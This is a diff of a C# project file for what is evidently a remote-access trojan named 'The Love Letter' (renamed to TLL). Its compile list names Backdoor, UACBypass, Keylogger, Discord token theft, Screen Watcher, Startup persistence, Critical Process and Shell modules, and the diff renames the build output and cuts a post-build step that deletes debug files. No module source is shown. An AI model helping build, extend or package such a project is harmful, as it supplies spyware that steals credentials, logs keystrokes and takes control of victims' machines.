@@ -6,9 +6,9 @@
     <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
     <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
     <ProjectGuid>{455E37BF-B767-4323-B8F5-A86CEECD3D91}</ProjectGuid>
-    <OutputType>WinExe</OutputType>
+    <OutputType>Exe</OutputType>
     <RootNamespace>Client</RootNamespace>
-    <AssemblyName>The Love Letter</AssemblyName>
+    <AssemblyName>TLL</AssemblyName>
     <TargetFrameworkVersion>v4.6</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
     <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
@@ -119,7 +119,7 @@
   <ItemGroup>
     <Compile Include="Armitage\Backdoor.cs" />
     <Compile Include="Armitage\Compiler.cs" />
-    <Compile Include="Armitage\CookieClearer.cs" />
+    <Compile Include="Armitage\Cookie Clearer.cs" />
     <Compile Include="Armitage\Cookies\DiscordToken.cs" />
     <Compile Include="Armitage\Critical Process.cs" />
     <Compile Include="Armitage\Startup.cs" />
@@ -127,8 +127,7 @@
     <Compile Include="Armitage\UAC\UACBypass.cs" />
     <Compile Include="Armitage\Copy.cs" />
     <Compile Include="Armitage\Shell.cs" />
-    <Compile Include="Armitage\Watchers\Global Watcher.cs" />
-    <Compile Include="Armitage\Watchers\Surveyor.cs" />
+    <Compile Include="Armitage\Watchers\Filesystem.cs" />
     <Compile Include="Armitage\Watchers\Keylogger.cs" />
     <Compile Include="Armitage\Watchers\Screen Watcher.cs" />
     <Compile Include="Communication\JSON Models\Update.cs" />
@@ -174,7 +173,6 @@
   </Target>
   <Import Project="..\packages\Costura.Fody.5.4.0-alpha0042\build\Costura.Fody.targets" Condition="Exists('..\packages\Costura.Fody.5.4.0-alpha0042\build\Costura.Fody.targets')" />
   <PropertyGroup>
-    <PostBuildEvent>del "$(TargetDir)*.xml", "$(TargetDir)*.pdb", "$(TargetDir)*.config"
-move "The Love Letter.exe" "TLL.exe"</PostBuildEvent>
+    <PostBuildEvent>del "$(TargetDir)*.xml", "$(TargetDir)*.pdb", "$(TargetDir)*.config"</PostBuildEvent>
   </PropertyGroup>
 </Project>
